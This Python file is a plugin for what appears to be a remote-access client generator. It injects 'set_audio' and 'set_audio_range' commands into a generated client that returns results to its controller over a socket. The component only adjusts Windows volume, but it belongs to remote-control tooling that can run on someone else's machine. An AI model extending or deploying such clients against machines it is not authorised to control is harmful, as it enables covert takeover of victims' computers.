import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from comtypes import CLSCTX_ALL')
        config.import_statements.append('from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume')
        config.import_statements.append('import ctypes')
        config.functions.append('''
def set_audio_range():        
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    range_vol = volume.GetVolumeRange()
    s.sendall(('[*]Max decibel level(100%) : ' + str(range_vol[1]) + '\\n[*]Minimum decibel level(0%) : ' + str(range_vol[0])).encode())


def set_audio(data):
    number = data.split(' ',1)[1]
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(float(number), None)
    s.sendall(('[+]Set volume to : ' + str(number)).encode())''')
        config.logics.append('''
            elif command == "set_audio":
                set_audio(data)''')
        config.logics.append('''
            elif command == "set_audio_range":
                set_audio_range()''')
        config.help_menu['set_audio <number>'] = 'Set system wide audio level by decibel'
        config.help_menu['set_audio_range'] = 'Get range of valid system wide audio level by decibel'
    elif option == 'info':
        print('\nName             : Set Audio component' \
              '\nOS               : Windows' \
              '\nRequired Modules : ctypes, pycaw (external)' \
              '\nCommands         : set_audio <number>' \
              '\nDescription      : Sets the system audio levels\n')
